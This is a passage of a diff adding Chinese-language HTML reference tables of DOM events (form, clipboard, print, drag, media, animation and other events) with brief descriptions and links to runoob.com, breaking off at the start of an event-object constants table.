+<td>&#x8BE5;&#x4E8B;&#x4EF6;&#x5728;&#x8868;&#x5355;&#x5143;&#x7D20;&#x7684;&#x5185;&#x5BB9;&#x6539;&#x53D8;&#x65F6;&#x89E6;&#x53D1;( <code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span><span class="token punctuation">&gt;</span></span>, <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>keygen</span><span class="token punctuation">&gt;</span></span>, <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span><span class="token punctuation">&gt;</span></span></code>, &#x548C; <code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span><span class="token punctuation">&gt;</span></span></code>)</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onfocus.html" target="_blank">onfocus</a></td>
+<td>&#x5143;&#x7D20;&#x83B7;&#x53D6;&#x7126;&#x70B9;&#x65F6;&#x89E6;&#x53D1;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onfocusin.html" target="_blank">onfocusin</a></td>
+<td>&#x5143;&#x7D20;&#x5373;&#x5C06;&#x83B7;&#x53D6;&#x7126;&#x70B9;&#x65F6;&#x89E6;&#x53D1;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onfocusout.html" target="_blank">onfocusout</a></td>
+<td>&#x5143;&#x7D20;&#x5373;&#x5C06;&#x5931;&#x53BB;&#x7126;&#x70B9;&#x65F6;&#x89E6;&#x53D1;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-oninput.html" target="_blank">oninput</a></td>
+<td>&#x5143;&#x7D20;&#x83B7;&#x53D6;&#x7528;&#x6237;&#x8F93;&#x5165;&#x65F6;&#x89E6;&#x53D1;</td>
+<td>3</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onreset.html" target="_blank">onreset</a></td>
+<td>&#x8868;&#x5355;&#x91CD;&#x7F6E;&#x65F6;&#x89E6;&#x53D1;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onsearch.html" target="_blank">onsearch</a></td>
+<td>&#x7528;&#x6237;&#x5411;&#x641C;&#x7D22;&#x57DF;&#x8F93;&#x5165;&#x6587;&#x672C;&#x65F6;&#x89E6;&#x53D1; ( <code>&lt;input=&quot;search&quot;&gt;</code>)</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onselect.html" target="_blank">onselect</a></td>
+<td>&#x7528;&#x6237;&#x9009;&#x53D6;&#x6587;&#x672C;&#x65F6;&#x89E6;&#x53D1; ( <code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span><span class="token punctuation">&gt;</span></span></code> &#x548C; <code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span><span class="token punctuation">&gt;</span></span></code>)</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onsubmit.html" target="_blank">onsubmit</a></td>
+<td>&#x8868;&#x5355;&#x63D0;&#x4EA4;&#x65F6;&#x89E6;&#x53D1;</td>
+<td>2</td>
+</tr>
+</tbody>
+</table>
+<h4 id="&#x526A;&#x8D34;&#x677F;&#x4E8B;&#x4EF6;"><a name="&#x526A;&#x8D34;&#x677F;&#x4E8B;&#x4EF6;" class="anchor-navigation-ex-anchor" href="#&#x526A;&#x8D34;&#x677F;&#x4E8B;&#x4EF6;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x526A;&#x8D34;&#x677F;&#x4E8B;&#x4EF6;" class="anchor-navigation-ex-anchor" href="#&#x526A;&#x8D34;&#x677F;&#x4E8B;&#x4EF6;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x526A;&#x8D34;&#x677F;&#x4E8B;&#x4EF6;</h4>
+<table>
+<thead>
+<tr>
+<th>&#x5C5E;&#x6027;</th>
+<th>&#x63CF;&#x8FF0;</th>
+<th>DOM</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-oncopy.html" target="_blank">oncopy</a></td>
+<td>&#x8BE5;&#x4E8B;&#x4EF6;&#x5728;&#x7528;&#x6237;&#x62F7;&#x8D1D;&#x5143;&#x7D20;&#x5185;&#x5BB9;&#x65F6;&#x89E6;&#x53D1;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-oncut.html" target="_blank">oncut</a></td>
+<td>&#x8BE5;&#x4E8B;&#x4EF6;&#x5728;&#x7528;&#x6237;&#x526A;&#x5207;&#x5143;&#x7D20;&#x5185;&#x5BB9;&#x65F6;&#x89E6;&#x53D1;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onpaste.html" target="_blank">onpaste</a></td>
+<td>&#x8BE5;&#x4E8B;&#x4EF6;&#x5728;&#x7528;&#x6237;&#x7C98;&#x8D34;&#x5143;&#x7D20;&#x5185;&#x5BB9;&#x65F6;&#x89E6;&#x53D1;</td>
+</tr>
+</tbody>
+</table>
+<h4 id="&#x6253;&#x5370;&#x4E8B;&#x4EF6;"><a name="&#x6253;&#x5370;&#x4E8B;&#x4EF6;" class="anchor-navigation-ex-anchor" href="#&#x6253;&#x5370;&#x4E8B;&#x4EF6;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x6253;&#x5370;&#x4E8B;&#x4EF6;" class="anchor-navigation-ex-anchor" href="#&#x6253;&#x5370;&#x4E8B;&#x4EF6;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x6253;&#x5370;&#x4E8B;&#x4EF6;</h4>
+<table>
+<thead>
+<tr>
+<th>&#x5C5E;&#x6027;</th>
+<th>&#x63CF;&#x8FF0;</th>
+<th>DOM</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onafterprint.html" target="_blank">onafterprint</a></td>
+<td>&#x8BE5;&#x4E8B;&#x4EF6;&#x5728;&#x9875;&#x9762;&#x5DF2;&#x7ECF;&#x5F00;&#x59CB;&#x6253;&#x5370;&#xFF0C;&#x6216;&#x8005;&#x6253;&#x5370;&#x7A97;&#x53E3;&#x5DF2;&#x7ECF;&#x5173;&#x95ED;&#x65F6;&#x89E6;&#x53D1;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onbeforeprint.html" target="_blank">onbeforeprint</a></td>
+<td>&#x8BE5;&#x4E8B;&#x4EF6;&#x5728;&#x9875;&#x9762;&#x5373;&#x5C06;&#x5F00;&#x59CB;&#x6253;&#x5370;&#x65F6;&#x89E6;&#x53D1;</td>
+</tr>
+</tbody>
+</table>
+<h4 id="&#x62D6;&#x52A8;&#x4E8B;&#x4EF6;"><a name="&#x62D6;&#x52A8;&#x4E8B;&#x4EF6;" class="anchor-navigation-ex-anchor" href="#&#x62D6;&#x52A8;&#x4E8B;&#x4EF6;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x62D6;&#x52A8;&#x4E8B;&#x4EF6;" class="anchor-navigation-ex-anchor" href="#&#x62D6;&#x52A8;&#x4E8B;&#x4EF6;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x62D6;&#x52A8;&#x4E8B;&#x4EF6;</h4>
+<table>
+<thead>
+<tr>
+<th>&#x4E8B;&#x4EF6;</th>
+<th>&#x63CF;&#x8FF0;</th>
+<th>DOM</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-ondrag.html" target="_blank">ondrag</a></td>
+<td>&#x8BE5;&#x4E8B;&#x4EF6;&#x5728;&#x5143;&#x7D20;&#x6B63;&#x5728;&#x62D6;&#x52A8;&#x65F6;&#x89E6;&#x53D1;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-ondragend.html" target="_blank">ondragend</a></td>
+<td>&#x8BE5;&#x4E8B;&#x4EF6;&#x5728;&#x7528;&#x6237;&#x5B8C;&#x6210;&#x5143;&#x7D20;&#x7684;&#x62D6;&#x52A8;&#x65F6;&#x89E6;&#x53D1;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-ondragenter.html" target="_blank">ondragenter</a></td>
+<td>&#x8BE5;&#x4E8B;&#x4EF6;&#x5728;&#x62D6;&#x52A8;&#x7684;&#x5143;&#x7D20;&#x8FDB;&#x5165;&#x653E;&#x7F6E;&#x76EE;&#x6807;&#x65F6;&#x89E6;&#x53D1;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-ondragleave.html" target="_blank">ondragleave</a></td>
+<td>&#x8BE5;&#x4E8B;&#x4EF6;&#x5728;&#x62D6;&#x52A8;&#x5143;&#x7D20;&#x79BB;&#x5F00;&#x653E;&#x7F6E;&#x76EE;&#x6807;&#x65F6;&#x89E6;&#x53D1;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-ondragover.html" target="_blank">ondragover</a></td>
+<td>&#x8BE5;&#x4E8B;&#x4EF6;&#x5728;&#x62D6;&#x52A8;&#x5143;&#x7D20;&#x5728;&#x653E;&#x7F6E;&#x76EE;&#x6807;&#x4E0A;&#x65F6;&#x89E6;&#x53D1;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-ondragstart.html" target="_blank">ondragstart</a></td>
+<td>&#x8BE5;&#x4E8B;&#x4EF6;&#x5728;&#x7528;&#x6237;&#x5F00;&#x59CB;&#x62D6;&#x52A8;&#x5143;&#x7D20;&#x65F6;&#x89E6;&#x53D1;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-ondrop.html" target="_blank">ondrop</a></td>
+<td>&#x8BE5;&#x4E8B;&#x4EF6;&#x5728;&#x62D6;&#x52A8;&#x5143;&#x7D20;&#x653E;&#x7F6E;&#x5728;&#x76EE;&#x6807;&#x533A;&#x57DF;&#x65F6;&#x89E6;&#x53D1;</td>
+</tr>
+</tbody>
+</table>
+<h4 id="&#x591A;&#x5A92;&#x4F53;&#xFF08;media&#xFF09;&#x4E8B;&#x4EF6;"><a name="&#x591A;&#x5A92;&#x4F53;&#xFF08;media&#xFF09;&#x4E8B;&#x4EF6;" class="anchor-navigation-ex-anchor" href="#&#x591A;&#x5A92;&#x4F53;&#xFF08;media&#xFF09;&#x4E8B;&#x4EF6;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x591A;&#x5A92;&#x4F53;&#xFF08;media&#xFF09;&#x4E8B;&#x4EF6;" class="anchor-navigation-ex-anchor" href="#&#x591A;&#x5A92;&#x4F53;&#xFF08;media&#xFF09;&#x4E8B;&#x4EF6;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x591A;&#x5A92;&#x4F53;&#xFF08;Media&#xFF09;&#x4E8B;&#x4EF6;</h4>
+<table>
+<thead>
+<tr>
+<th>&#x4E8B;&#x4EF6;</th>
+<th>&#x63CF;&#x8FF0;</th>
+<th>DOM</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onabort-media.html" target="_blank">onabort</a></td>
+<td>&#x4E8B;&#x4EF6;&#x5728;&#x89C6;&#x9891;/&#x97F3;&#x9891;&#xFF08;audio/video&#xFF09;&#x7EC8;&#x6B62;&#x52A0;&#x8F7D;&#x65F6;&#x89E6;&#x53D1;&#x3002;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-oncanplay.html" target="_blank">oncanplay</a></td>
+<td>&#x4E8B;&#x4EF6;&#x5728;&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x5F00;&#x59CB;&#x64AD;&#x653E;&#x89C6;&#x9891;/&#x97F3;&#x9891;&#xFF08;audio/video&#xFF09;&#x65F6;&#x89E6;&#x53D1;&#x3002;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-oncanplaythrough.html" target="_blank">oncanplaythrough</a></td>
+<td>&#x4E8B;&#x4EF6;&#x5728;&#x89C6;&#x9891;/&#x97F3;&#x9891;&#xFF08;audio/video&#xFF09;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x64AD;&#x653E;&#x4E14;&#x65E0;&#x9700;&#x505C;&#x987F;&#x548C;&#x7F13;&#x51B2;&#x65F6;&#x89E6;&#x53D1;&#x3002;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-ondurationchange.html" target="_blank">ondurationchange</a></td>
+<td>&#x4E8B;&#x4EF6;&#x5728;&#x89C6;&#x9891;/&#x97F3;&#x9891;&#xFF08;audio/video&#xFF09;&#x7684;&#x65F6;&#x957F;&#x53D1;&#x751F;&#x53D8;&#x5316;&#x65F6;&#x89E6;&#x53D1;&#x3002;</td>
+<td></td>
+</tr>
+<tr>
+<td>onemptied</td>
+<td>&#x5F53;&#x671F;&#x64AD;&#x653E;&#x5217;&#x8868;&#x4E3A;&#x7A7A;&#x65F6;&#x89E6;&#x53D1;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onended.html" target="_blank">onended</a></td>
+<td>&#x4E8B;&#x4EF6;&#x5728;&#x89C6;&#x9891;/&#x97F3;&#x9891;&#xFF08;audio/video&#xFF09;&#x64AD;&#x653E;&#x7ED3;&#x675F;&#x65F6;&#x89E6;&#x53D1;&#x3002;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onerror-media.html" target="_blank">onerror</a></td>
+<td>&#x4E8B;&#x4EF6;&#x5728;&#x89C6;&#x9891;/&#x97F3;&#x9891;&#xFF08;audio/video&#xFF09;&#x6570;&#x636E;&#x52A0;&#x8F7D;&#x671F;&#x95F4;&#x53D1;&#x751F;&#x9519;&#x8BEF;&#x65F6;&#x89E6;&#x53D1;&#x3002;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onloadeddata.html" target="_blank">onloadeddata</a></td>
+<td>&#x4E8B;&#x4EF6;&#x5728;&#x6D4F;&#x89C8;&#x5668;&#x52A0;&#x8F7D;&#x89C6;&#x9891;/&#x97F3;&#x9891;&#xFF08;audio/video&#xFF09;&#x5F53;&#x524D;&#x5E27;&#x65F6;&#x89E6;&#x53D1;&#x89E6;&#x53D1;&#x3002;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onloadedmetadata.html" target="_blank">onloadedmetadata</a></td>
+<td>&#x4E8B;&#x4EF6;&#x5728;&#x6307;&#x5B9A;&#x89C6;&#x9891;/&#x97F3;&#x9891;&#xFF08;audio/video&#xFF09;&#x7684;&#x5143;&#x6570;&#x636E;&#x52A0;&#x8F7D;&#x540E;&#x89E6;&#x53D1;&#x3002;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onloadstart.html" target="_blank">onloadstart</a></td>
+<td>&#x4E8B;&#x4EF6;&#x5728;&#x6D4F;&#x89C8;&#x5668;&#x5F00;&#x59CB;&#x5BFB;&#x627E;&#x6307;&#x5B9A;&#x89C6;&#x9891;/&#x97F3;&#x9891;&#xFF08;audio/video&#xFF09;&#x89E6;&#x53D1;&#x3002;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onpause.html" target="_blank">onpause</a></td>
+<td>&#x4E8B;&#x4EF6;&#x5728;&#x89C6;&#x9891;/&#x97F3;&#x9891;&#xFF08;audio/video&#xFF09;&#x6682;&#x505C;&#x65F6;&#x89E6;&#x53D1;&#x3002;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onplay.html" target="_blank">onplay</a></td>
+<td>&#x4E8B;&#x4EF6;&#x5728;&#x89C6;&#x9891;/&#x97F3;&#x9891;&#xFF08;audio/video&#xFF09;&#x5F00;&#x59CB;&#x64AD;&#x653E;&#x65F6;&#x89E6;&#x53D1;&#x3002;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onplaying.html" target="_blank">onplaying</a></td>
+<td>&#x4E8B;&#x4EF6;&#x5728;&#x89C6;&#x9891;/&#x97F3;&#x9891;&#xFF08;audio/video&#xFF09;&#x6682;&#x505C;&#x6216;&#x8005;&#x5728;&#x7F13;&#x51B2;&#x540E;&#x51C6;&#x5907;&#x91CD;&#x65B0;&#x5F00;&#x59CB;&#x64AD;&#x653E;&#x65F6;&#x89E6;&#x53D1;&#x3002;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onprogress.html" target="_blank">onprogress</a></td>
+<td>&#x4E8B;&#x4EF6;&#x5728;&#x6D4F;&#x89C8;&#x5668;&#x4E0B;&#x8F7D;&#x6307;&#x5B9A;&#x7684;&#x89C6;&#x9891;/&#x97F3;&#x9891;&#xFF08;audio/video&#xFF09;&#x65F6;&#x89E6;&#x53D1;&#x3002;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onratechange.html" target="_blank">onratechange</a></td>
+<td>&#x4E8B;&#x4EF6;&#x5728;&#x89C6;&#x9891;/&#x97F3;&#x9891;&#xFF08;audio/video&#xFF09;&#x7684;&#x64AD;&#x653E;&#x901F;&#x5EA6;&#x53D1;&#x9001;&#x6539;&#x53D8;&#x65F6;&#x89E6;&#x53D1;&#x3002;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onseeked.html" target="_blank">onseeked</a></td>
+<td>&#x4E8B;&#x4EF6;&#x5728;&#x7528;&#x6237;&#x91CD;&#x65B0;&#x5B9A;&#x4F4D;&#x89C6;&#x9891;/&#x97F3;&#x9891;&#xFF08;audio/video&#xFF09;&#x7684;&#x64AD;&#x653E;&#x4F4D;&#x7F6E;&#x540E;&#x89E6;&#x53D1;&#x3002;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onseeking.html" target="_blank">onseeking</a></td>
+<td>&#x4E8B;&#x4EF6;&#x5728;&#x7528;&#x6237;&#x5F00;&#x59CB;&#x91CD;&#x65B0;&#x5B9A;&#x4F4D;&#x89C6;&#x9891;/&#x97F3;&#x9891;&#xFF08;audio/video&#xFF09;&#x65F6;&#x89E6;&#x53D1;&#x3002;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onstalled.html" target="_blank">onstalled</a></td>
+<td>&#x4E8B;&#x4EF6;&#x5728;&#x6D4F;&#x89C8;&#x5668;&#x83B7;&#x53D6;&#x5A92;&#x4F53;&#x6570;&#x636E;&#xFF0C;&#x4F46;&#x5A92;&#x4F53;&#x6570;&#x636E;&#x4E0D;&#x53EF;&#x7528;&#x65F6;&#x89E6;&#x53D1;&#x3002;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onsuspend.html" target="_blank">onsuspend</a></td>
+<td>&#x4E8B;&#x4EF6;&#x5728;&#x6D4F;&#x89C8;&#x5668;&#x8BFB;&#x53D6;&#x5A92;&#x4F53;&#x6570;&#x636E;&#x4E2D;&#x6B62;&#x65F6;&#x89E6;&#x53D1;&#x3002;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-ontimeupdate.html" target="_blank">ontimeupdate</a></td>
+<td>&#x4E8B;&#x4EF6;&#x5728;&#x5F53;&#x524D;&#x7684;&#x64AD;&#x653E;&#x4F4D;&#x7F6E;&#x53D1;&#x9001;&#x6539;&#x53D8;&#x65F6;&#x89E6;&#x53D1;&#x3002;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onvolumechange.html" target="_blank">onvolumechange</a></td>
+<td>&#x4E8B;&#x4EF6;&#x5728;&#x97F3;&#x91CF;&#x53D1;&#x751F;&#x6539;&#x53D8;&#x65F6;&#x89E6;&#x53D1;&#x3002;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onwaiting.html" target="_blank">onwaiting</a></td>
+<td>&#x4E8B;&#x4EF6;&#x5728;&#x89C6;&#x9891;&#x7531;&#x4E8E;&#x8981;&#x64AD;&#x653E;&#x4E0B;&#x4E00;&#x5E27;&#x800C;&#x9700;&#x8981;&#x7F13;&#x51B2;&#x65F6;&#x89E6;&#x53D1;&#x3002;</td>
+</tr>
+</tbody>
+</table>
+<h4 id="&#x52A8;&#x753B;&#x4E8B;&#x4EF6;"><a name="&#x52A8;&#x753B;&#x4E8B;&#x4EF6;" class="anchor-navigation-ex-anchor" href="#&#x52A8;&#x753B;&#x4E8B;&#x4EF6;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x52A8;&#x753B;&#x4E8B;&#x4EF6;" class="anchor-navigation-ex-anchor" href="#&#x52A8;&#x753B;&#x4E8B;&#x4EF6;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x52A8;&#x753B;&#x4E8B;&#x4EF6;</h4>
+<table>
+<thead>
+<tr>
+<th>&#x4E8B;&#x4EF6;</th>
+<th>&#x63CF;&#x8FF0;</th>
+<th>DOM</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-animationend.html" target="_blank">animationend</a></td>
+<td>&#x8BE5;&#x4E8B;&#x4EF6;&#x5728; CSS &#x52A8;&#x753B;&#x7ED3;&#x675F;&#x64AD;&#x653E;&#x65F6;&#x89E6;&#x53D1;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-animationiteration.html" target="_blank">animationiteration</a></td>
+<td>&#x8BE5;&#x4E8B;&#x4EF6;&#x5728; CSS &#x52A8;&#x753B;&#x91CD;&#x590D;&#x64AD;&#x653E;&#x65F6;&#x89E6;&#x53D1;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-animationstart.html" target="_blank">animationstart</a></td>
+<td>&#x8BE5;&#x4E8B;&#x4EF6;&#x5728; CSS &#x52A8;&#x753B;&#x5F00;&#x59CB;&#x64AD;&#x653E;&#x65F6;&#x89E6;&#x53D1;</td>
+</tr>
+</tbody>
+</table>
+<h4 id="&#x8FC7;&#x6E21;&#x4E8B;&#x4EF6;"><a name="&#x8FC7;&#x6E21;&#x4E8B;&#x4EF6;" class="anchor-navigation-ex-anchor" href="#&#x8FC7;&#x6E21;&#x4E8B;&#x4EF6;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x8FC7;&#x6E21;&#x4E8B;&#x4EF6;" class="anchor-navigation-ex-anchor" href="#&#x8FC7;&#x6E21;&#x4E8B;&#x4EF6;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x8FC7;&#x6E21;&#x4E8B;&#x4EF6;</h4>
+<table>
+<thead>
+<tr>
+<th>&#x4E8B;&#x4EF6;</th>
+<th>&#x63CF;&#x8FF0;</th>
+<th>DOM</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-transitionend.html" target="_blank">transitionend</a></td>
+<td>&#x8BE5;&#x4E8B;&#x4EF6;&#x5728; CSS &#x5B8C;&#x6210;&#x8FC7;&#x6E21;&#x540E;&#x89E6;&#x53D1;&#x3002;</td>
+</tr>
+</tbody>
+</table>
+<h4 id="&#x5176;&#x4ED6;&#x4E8B;&#x4EF6;"><a name="&#x5176;&#x4ED6;&#x4E8B;&#x4EF6;" class="anchor-navigation-ex-anchor" href="#&#x5176;&#x4ED6;&#x4E8B;&#x4EF6;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x5176;&#x4ED6;&#x4E8B;&#x4EF6;" class="anchor-navigation-ex-anchor" href="#&#x5176;&#x4ED6;&#x4E8B;&#x4EF6;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x5176;&#x4ED6;&#x4E8B;&#x4EF6;</h4>
+<table>
+<thead>
+<tr>
+<th>&#x4E8B;&#x4EF6;</th>
+<th>&#x63CF;&#x8FF0;</th>
+<th>DOM</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>onmessage</td>
+<td>&#x8BE5;&#x4E8B;&#x4EF6;&#x901A;&#x8FC7;&#x6216;&#x8005;&#x4ECE;&#x5BF9;&#x8C61;(WebSocket, Web Worker, Event Source &#x6216;&#x8005;&#x5B50; frame &#x6216;&#x7236;&#x7A97;&#x53E3;)&#x63A5;&#x6536;&#x5230;&#x6D88;&#x606F;&#x65F6;&#x89E6;&#x53D1;</td>
+<td></td>
+</tr>
+<tr>
+<td>onmousewheel</td>
+<td>&#x5DF2;&#x5E9F;&#x5F03;&#x3002; &#x4F7F;&#x7528; <a href="https://www.runoob.com/jsref/event-onwheel.html" target="_blank">onwheel</a></td>
+<td></td>
+</tr>
+<tr>
+<td>&#x4E8B;&#x4EF6;&#x66FF;&#x4EE3;</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-ononline.html" target="_blank">ononline</a></td>
+<td>&#x8BE5;&#x4E8B;&#x4EF6;&#x5728;&#x6D4F;&#x89C8;&#x5668;&#x5F00;&#x59CB;&#x5728;&#x7EBF;&#x5DE5;&#x4F5C;&#x65F6;&#x89E6;&#x53D1;&#x3002;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onoffline.html" target="_blank">onoffline</a></td>
+<td>&#x8BE5;&#x4E8B;&#x4EF6;&#x5728;&#x6D4F;&#x89C8;&#x5668;&#x5F00;&#x59CB;&#x79BB;&#x7EBF;&#x5DE5;&#x4F5C;&#x65F6;&#x89E6;&#x53D1;&#x3002;</td>
+<td></td>
+</tr>
+<tr>
+<td>onpopstate</td>
+<td>&#x8BE5;&#x4E8B;&#x4EF6;&#x5728;&#x7A97;&#x53E3;&#x7684;&#x6D4F;&#x89C8;&#x5386;&#x53F2;&#xFF08;history &#x5BF9;&#x8C61;&#xFF09;&#x53D1;&#x751F;&#x6539;&#x53D8;&#x65F6;&#x89E6;&#x53D1;&#x3002;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onshow.html" target="_blank">onshow</a></td>
+<td>&#x8BE5;&#x4E8B;&#x4EF6;&#x5F53;<code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>menu</span><span class="token punctuation">&gt;</span></span></code> &#x5143;&#x7D20;&#x5728;&#x4E0A;&#x4E0B;&#x6587;&#x83DC;&#x5355;&#x663E;&#x793A;&#x65F6;&#x89E6;&#x53D1;</td>
+<td></td>
+</tr>
+<tr>
+<td>onstorage</td>
+<td>&#x8BE5;&#x4E8B;&#x4EF6;&#x5728; Web Storage(HTML 5 Web &#x5B58;&#x50A8;)&#x66F4;&#x65B0;&#x65F6;&#x89E6;&#x53D1;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-ontoggle.html" target="_blank">ontoggle</a></td>
+<td>&#x8BE5;&#x4E8B;&#x4EF6;&#x5728;&#x7528;&#x6237;&#x6253;&#x5F00;&#x6216;&#x5173;&#x95ED; <code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>details</span><span class="token punctuation">&gt;</span></span></code>&#x5143;&#x7D20;&#x65F6;&#x89E6;&#x53D1;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onwheel.html" target="_blank">onwheel</a></td>
+<td>&#x8BE5;&#x4E8B;&#x4EF6;&#x5728;&#x9F20;&#x6807;&#x6EDA;&#x8F6E;&#x5728;&#x5143;&#x7D20;&#x4E0A;&#x4E0B;&#x6EDA;&#x52A8;&#x65F6;&#x89E6;&#x53D1;</td>
+</tr>
+</tbody>
+</table>
+<h4 id="&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;"><a name="&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;" class="anchor-navigation-ex-anchor" href="#&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;" class="anchor-navigation-ex-anchor" href="#&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;</h4>
+<h5 id="&#x5E38;&#x91CF;"><a name="&#x5E38;&#x91CF;" class="anchor-navigation-ex-anchor" href="#&#x5E38;&#x91CF;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x5E38;&#x91CF;" class="anchor-navigation-ex-anchor" href="#&#x5E38;&#x91CF;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x5E38;&#x91CF;</h5>
+<table>
+<thead>
+<tr>
+<th>&#x9759;&#x6001;&#x53D8;&#x91CF;</th>
+<th>&#x63CF;&#x8FF0;</th>
+<th>DOM</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CAPTURING-PHASE</td>
+<td>&#x5F53;&#x524D;&#x4E8B;&#x4EF6;&#x9636;&#x6BB5;&#x4E3A;&#x6355;&#x83B7;&#x9636;&#x6BB5;(1)</td>
+<td>1</td>
+</tr>
+<tr>
+<td>AT-TARGET</td>
+<td>&#x5F53;&#x524D;&#x4E8B;&#x4EF6;&#x662F;&#x76EE;&#x6807;&#x9636;&#x6BB5;,&#x5728;&#x8BC4;&#x4F30;&#x76EE;&#x6807;&#x4E8B;&#x4EF6;(1)</td>
+<td>2</td>
+</tr>
+<tr>
+<td>BUBBLING-PHASE</td>
